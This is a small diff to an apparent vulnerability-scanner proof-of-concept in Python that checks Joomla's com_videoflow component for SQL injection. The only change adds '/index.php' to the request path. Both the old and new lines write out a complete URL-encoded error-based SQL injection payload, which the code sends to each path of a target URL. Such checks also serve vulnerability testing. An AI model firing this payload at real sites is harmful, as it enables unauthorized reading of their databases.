@@ -30,7 +30,7 @@ def poc(url):
             url = 'http://' + url
     for each in iterate_path(url):
         plain, cipher = randomMD5(3)
-        payload = "?option=com_videoflow&task=search&vs=1&searchword=-3920%27%29%20OR%201%20GROUP%20BY%20CONCAT%280x71786a7a71%2C%28MID%28%28IFNULL%28CAST%28md5%28{plain}%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C54%29%29%2C0x716b6b7a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23".format(plain=plain)
+        payload = "/index.php?option=com_videoflow&task=search&vs=1&searchword=-3920%27%29%20OR%201%20GROUP%20BY%20CONCAT%280x71786a7a71%2C%28MID%28%28IFNULL%28CAST%28md5%28{plain}%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C54%29%29%2C0x716b6b7a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23".format(plain=plain)
         if '?' in each:
             continue
         target_url = url.rstrip('/') + payload
